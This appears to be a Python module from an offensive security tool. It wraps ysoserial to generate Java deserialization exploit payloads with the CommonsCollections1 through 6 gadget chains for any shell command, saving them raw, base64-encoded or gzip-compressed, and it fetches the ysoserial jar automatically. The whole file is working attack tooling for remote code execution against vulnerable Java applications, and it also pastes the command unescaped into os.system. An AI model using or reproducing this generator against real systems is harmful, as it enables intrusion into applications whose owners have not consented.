import os
import os
from urllib import request
import os.path
from interface.colors import VERDE,BRANCO,AMARELO,CLARO,VERMELHO

class Payload_Gzip():
    def __init__(self,command):
        self.command = command        
        for x in range(1, 7):
            print('')
            print(VERMELHO + f'\nCommonsCollections{x}' + BRANCO)
            print('')
            os.system("\njava -jar ysoserial-all.jar CommonsCollections{} '{}' | gzip | base64 -w0\n".format(x,command))

class Payload():
    def __init__(self,payload):
        self.payload = payload
        for x in range(1, 7):
            print('')
            print(VERMELHO + f'\nCommonsCollections{x}' + BRANCO)
            print('')
            os.system("java -jar ysoserial-all.jar CommonsCollections{} '{}' | base64 -w0\n".format(x,payload))

class Payload_Bin():
    def __init__(self,command):
        self.command = command
        def gera():
            for x in range(1, 7):
                print('')
                print(VERMELHO + f'\nCommonsCollections{x}' + BRANCO)
                print('')
                os.system(f"java -jar ysoserial-all.jar CommonsCollections{x} '{command}' > payloads_bin/data{x}\n")

        if os.path.exists('payloads_bin'):
            gera()
        else:
            os.system('mkdir payloads_bin')
            gera()
        
def ysoserial():
    def download():
        file_url = 'https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar'
        file = 'ysoserial-all.jar'
        request.urlretrieve(file_url, file)

    if os.path.exists('ysoserial-all.jar'):
        print('')
    else:
        print( VERMELHO + 'Ysoserial not found, realizing a download...' + BRANCO)
        download()
        if os.path.exists('ysoserial-all.jar'):
            print( VERDE + '\nEverything is OK!' + BRANCO)
